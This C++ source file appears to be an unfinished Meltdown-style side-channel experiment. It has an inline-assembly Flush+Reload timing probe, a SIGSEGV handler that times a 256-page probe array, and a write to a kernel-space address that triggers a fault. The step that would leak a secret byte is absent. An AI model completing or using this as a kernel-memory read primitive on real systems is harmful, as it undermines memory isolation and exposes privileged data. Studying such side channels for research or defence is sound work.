#include <iostream>
#include <signal.h>
#include <sys/mman.h>

const unsigned long threshold = 100;

uint8_t* data;

int probe(uint8_t* addr, unsigned long threshold) {
    volatile unsigned long time;

    asm __volatile__(" mfence                   \n"
                     " lfence                   \n"
                     " rdtsc                    \n"
                     " lfence                   \n"
                     " mov esi, eax             \n"
                     " mov al, BYTE PTR [%1]  \n"
                     " lfence                   \n"
                     " rdtsc                    \n"
                     " sub eax, esi             \n"
                     " clflush [%1]             \n"
                     : "=a"(time)
                     : "c"(addr)
                     : "esi", "edx");
    
    return time < threshold;
}

static void handler(int sig, siginfo_t *si, void *unused)
{
    uint8_t result[256];
    printf("Got SIGSEGV at address: 0x%lx\n",(long) si->si_addr);
    printf("Implements the handler only\n");
    for(int i = 0; i < 256; ++i)
        result[i] = probe(&data[i* 4096], threshold);

    for(int i  = 0; i < 256; ++i)
        std::cout << static_cast<int>(result[i]) << std::endl;
    
    exit(EXIT_FAILURE);
}

int main(int argc, char *argv[])
{
    data = new uint8_t[256*4096];
    struct sigaction sa;

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1)
        std::cout <<"failed" << std::endl;
                                
    
    uint8_t* addr = reinterpret_cast<uint8_t*>(0xffff880000000000);
    addr[0] = 10;

    // probe(addr, threshold);
    return 0;
}
